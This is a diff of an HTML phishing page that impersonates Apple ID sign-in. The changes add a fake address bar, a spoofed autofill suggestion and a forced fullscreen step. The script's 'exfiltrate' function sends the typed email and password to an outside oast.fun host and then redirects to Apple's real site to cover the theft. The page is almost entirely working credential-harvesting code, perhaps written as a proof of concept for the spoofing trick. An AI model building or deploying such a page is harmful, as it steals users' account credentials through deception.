@@ -1,85 +1,120 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Apple ID - Sign In</title>
+  <title>🔐 Sign in to Your Apple ID</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      font-family: -apple-system, sans-serif;
+    html, body {
       margin: 0;
-      background: #f2f2f7;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding-top: 100px;
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      background-color: #f2f2f7;
+      color: #000;
+      height: 100%;
+      overflow: hidden;
     }
 
-    input {
-      padding: 14px;
-      font-size: 17px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      width: 280px;
-      margin-bottom: 14px;
+    .navbar {
+      height: 44px;
+      background-color: #f9f9f9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 15px;
+      font-weight: 500;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+      z-index: 9999;
+      position: fixed;
+      width: 100%;
+      top: 0;
     }
 
     .container {
-      position: relative;
+      padding: 80px 24px;
+      max-width: 380px;
+      margin: auto;
     }
 
-    .overlay-suggestion {
+    input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 14px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      font-size: 17px;
+    }
+
+    .autofill-overlay {
       position: absolute;
-      top: 12px;
-      left: 0;
-      width: 280px;
+      top: 144px;
+      left: 24px;
+      width: calc(100% - 48px);
       height: 46px;
-      background: white;
-      border: 1px solid #ddd;
+      background: #fff;
+      border: 1px solid #ccc;
       border-radius: 8px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-      display: flex;
-      align-items: center;
-      padding-left: 14px;
+      padding: 12px;
       font-size: 16px;
       color: #222;
-      cursor: pointer;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.08);
       z-index: 999;
+      cursor: pointer;
+    }
+
+    .fullscreen-btn {
+      margin-top: 20px;
+      padding: 12px;
+      background: #007aff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      width: 100%;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
 
-<h2>🔐 Sign in with your Apple ID</h2>
+<div class="navbar">🔒 https://appleid.apple.com</div>
 
 <div class="container">
-  <input type="email" id="email" placeholder="Email / Apple ID" autocomplete="on" autofocus>
+  <h2>Apple ID Required</h2>
 
-  <!-- ⚠️ Overlay palsu di atas native autofill -->
-  <div class="overlay-suggestion" onclick="capture()">user@icloud.com</div>
+  <input type="email" id="email" placeholder="Email or Apple ID" autocomplete="on" autofocus>
+  <div class="autofill-overlay" onclick="stepIntoFullscreen()">user@icloud.com</div>
+
+  <input type="password" id="pass" placeholder="Password" autocomplete="on">
+
+  <button class="fullscreen-btn" onclick="stepIntoFullscreen()">Continue</button>
 </div>
 
-<input type="password" id="pass" placeholder="Password" autocomplete="on">
-
 <script>
-function capture() {
-  // Allow autofill to trigger after overlay click
-  setTimeout(() => {
+function stepIntoFullscreen() {
+  const el = document.documentElement;
+  if (el.requestFullscreen) el.requestFullscreen();
+  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+
+  // Chained with overlay click → now start idle timing
+  window.requestIdleCallback(() => {
     const email = document.getElementById('email').value;
     const pass = document.getElementById('pass').value;
 
-    if (email && pass) {
-      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/log", {
-        method: "POST",
-        body: JSON.stringify({ email, pass }),
-        headers: { "Content-Type": "application/json" }
-      });
-
-      // Optional redirect to appleid to hide trace
-      setTimeout(() => {
-        location.href = "https://appleid.apple.com";
-      }, 700);
+    if (email.length > 3 && pass.length > 3) {
+      exfiltrate(email, pass);
     }
-  }, 300); // delay to allow autofill .value to populate
+  }, { timeout: 1000 }); // <= short delay but stealth
+}
+
+function exfiltrate(email, pass) {
+  fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/steal", {
+    method: "POST",
+    body: JSON.stringify({ email, pass }),
+    headers: { "Content-Type": "application/json" }
+  });
+
+  setTimeout(() => {
+    location.href = "https://appleid.apple.com"; // misattribution
+  }, 700);
 }
 </script>
 
